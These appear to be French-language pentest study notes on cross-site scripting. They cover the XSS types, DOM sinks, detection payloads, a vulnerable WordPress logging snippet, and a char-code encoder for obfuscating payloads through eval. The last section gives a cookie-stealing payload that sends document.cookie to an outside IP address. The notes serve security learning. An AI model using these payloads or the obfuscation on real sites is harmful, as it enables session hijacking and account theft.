Code exécuté sur une page chargé par un autre utilisateur. Causé par une mauvaise gestion des charactères spéciaux
# Chemin d'une requête
Plusieurs intervenant peuvent encoder/bloquer des requêtes causants plusieurs cas étranges à divers niveaux.
Navigateur(encode)/Outils(encode pas) -> WAF(pourrait filtrer) -> serveur(décode,décode pas,encode, encode pas) -> réponse (en-tête de protection, pas d'en-tête)

# Stored (Persistent)
Le contenu malicieu est placé sur le serveur pour être retourné plus tard à un utilisateur. Ex: post ou commentaire.
# Reflected (non-persistent)
Le contenu se trouve dans la requête ou le lien. Ex: Résultat de recherche ou message d'erreur
# DOM-based XSS (Non-persistent)
N'atteint jamais le serveur. Affiché dans le navigateur et processé du côté client. Ne charge pas une nouvelle page mais modifie la page courrante (DOM). Ex: paramètre HTTP côté client ou tag d'encrage.
Source: objet JS qui prend entrées utilisateur (param URL ou champ)
Sink: Fonction qui écrit l'entrée vers un DOM
* document.write()
* DOM.innerHTML
* DOM.outerHTML
* add()
* after()
* append()
Regarder le code JS, si les entrées ne sont pas vérifié

# Détection
Indice: si on peut voir un résultat d'une de nos entrées	
Vérifier que les charactères spéciaux sont supportés:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
< > ' " { } ;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~js
<script>alert(42)</script>
<script>alert(window.origin)</script>
<script>print()</script>
#Transorme le code le suivant en texte
<plaintext>
<script>alert(document.cookie)</script>
<img src="" onerror=alert(window.origin)>
<iframe src=”javascript:alert(1)”></iframe>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
https://github.com/payloadbox/xss-payload-list

On peut ensuite voir notre dans le code source de la page.

# Example de code vulnérable
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~js
function VST_save_record() {
	global $wpdb;
	$table_name = $wpdb->prefix . 'VST_registros';

	VST_create_table_records();

	return $wpdb->insert(
		$table_name,
		array(
			'patch' => $_SERVER["REQUEST_URI"],
			'datetime' => current_time( 'mysql' ),
			'useragent' => $_SERVER['HTTP_USER_AGENT'],
			'ip' => $_SERVER['HTTP_X_FORWARDED_FOR']
		)
	);
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

useragent inclue directement le contenu de l'en-tête

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~html
<td>'.$record->useragent.'</td>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Exécuter du code en HTML
1.  minifier le code (https://jscompress.com/ )
2.  encoder 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~js
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



*eval()* exécute du code javascript en string

```js
<script>eval(String.fromCharCode(118,97,...,59))</script>
```

# Voler des cookies
```js
<img src=x onerror=this.src='[http://10.10.14.115:8000/'+btoa(document.cookie)>
```